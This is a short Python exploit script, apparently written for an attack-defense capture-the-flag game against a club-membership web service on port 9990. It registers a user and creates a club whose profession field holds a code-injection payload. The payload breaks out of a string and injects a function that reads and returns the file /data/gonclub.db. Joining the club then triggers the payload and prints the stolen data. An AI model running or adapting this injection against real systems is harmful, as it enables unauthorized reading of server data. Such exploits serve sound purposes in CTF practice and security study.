#!/usr/bin/env python3

import sys
import requests
from checklib import *

ip = sys.argv[1]

host = f'http://{ip}:9990'


def register_user(username=None, password=None):
    username = username or rnd_username()
    password = password or rnd_password()

    sess = get_initialized_session()

    r = sess.post(f'{host}/zaregatsya', json={'имя': username, 'пароль': password})
    return username, password, sess

def create_club(sess: requests.Session, title, password='', jobf=''):
    data = {'название': title, 'пароль': password, 'профессия': jobf}
    r = sess.post(f'{host}/novklub', json=data)
    return r

def join_club(sess:requests.Session, club_id, password=''):
    data = {'клуб': club_id, 'пароль': password}
    r = sess.post(f'{host}/vstupit', json=data)
    return r


_, _, sess = register_user()

club_resp = create_club(sess, 'totallynotasploit', jobf='asd");Функция оо(x)д, ок = прочитатьфайл("/data/gonclub.db"); Возврат д;КонецФункции;//')

print(join_club(sess, club_resp.json()['ид']).text, flush=True)


